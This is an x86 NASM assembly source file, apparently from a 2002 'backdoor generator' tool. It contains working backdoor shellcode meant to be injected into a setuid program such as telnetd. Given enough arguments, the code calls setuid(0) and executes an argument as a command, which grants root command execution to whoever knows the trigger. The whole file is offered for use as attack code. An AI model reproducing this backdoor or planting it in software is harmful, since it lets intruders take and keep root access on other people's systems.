/* asm/list2.nasm   asm code of a backdoor
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under
 * the licence given in the file "Licence" distributed in the
 * Gbkdoor archive.
 */


;this code will simply execute the (argnummin-1)th parameter
;given as argument 
;example:
;telnetd 1 2 3 .. (argnummin-2) /bin/ls /root
;(where telnetd is a suid program infected by the backdoor)

;I'll setuid(0) too

global _start

_start:
;params on the stack are:
;[esp]=argc
;[esp+4]=argv[0]
;[esp+8]=argv[1]
;...
;0=[esp+n*4]=end of argv vector
;[esp+(n+1)*4]=env[0]
;[esp+(n+2)*4]=env[1]
;...
;0=end of env vector
argnummin equ 5

	cmp [esp],byte argnummin	;test for argc>2
	jge itsok
label_jmp:
	jmp exit
itsok:

	xor eax,eax
	
;setuid to root 
	mov al,23
	xor ebx,ebx
	int 80h

;exec argv[2]
	mov al,11	;execve(argv[2],&argv[2],NULL)
	lea ecx,[esp+argnummin*4]
	mov ebx,[ecx]
	xor edx,edx
	int 80h



exit:
herejump:
	xor eax,eax
	inc eax
	int 0x80
	
%ifdef DEBUG
string_OK db 'all right, the argument match "Gildoexec"',10,0
%endif

string_Gildoexec db 'Gildoexec', 0
